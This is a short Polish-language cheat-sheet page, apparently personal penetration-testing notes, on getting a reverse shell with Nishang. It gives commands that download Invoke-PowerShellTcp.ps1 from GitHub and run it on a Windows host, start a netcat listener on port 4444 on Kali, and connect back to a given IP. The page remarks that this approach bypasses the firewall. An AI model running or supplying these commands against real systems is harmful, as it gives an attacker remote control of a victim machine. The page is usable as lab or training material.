---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# Nishang

To Kali nasłuchuje i stacja z Windowsem sama się do Kaliego podłącza - lepsze bo obchodzimy firewall

**Win**

{% code overflow="wrap" fullWidth="true" %}
```python
Invoke-WebRequest -uri https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -OutFile Invoke-PowerShellTcp.ps1
..\Invoke-PowerShellTcp.ps1
Invoke-PowerShellTcp
```
{% endcode %}

**Kali**

```python
#wystawiamy listenera
nc -nlvp 4444
```

**Win**

```python
Invoke-PowerShellTcp -Reverse -IPAddress 10.20.10.31 -port 4444
#i mamy RevShella na kalim
```
